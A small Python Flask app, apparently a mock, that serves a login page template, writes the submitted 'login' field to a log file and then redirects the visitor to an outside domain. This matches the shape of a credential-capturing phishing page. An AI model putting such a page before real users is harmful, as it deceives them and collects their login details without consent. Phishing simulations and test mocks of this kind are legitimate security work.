from flask import Flask, render_template, request, redirect
from logging import basicConfig
import logging

basicConfig(filename="mock.log", level=logging.DEBUG, filemode="w")
app = Flask(__name__)


@app.route('/')
def hello_world():
    return render_template('account/login.html')


@app.route("/login", methods=["POST"])
def submit_login():
    app.logger.error(request.form['login'])
    return redirect("https://datahub.arcticshores.com")


if __name__ == '__main__':
    app.run()
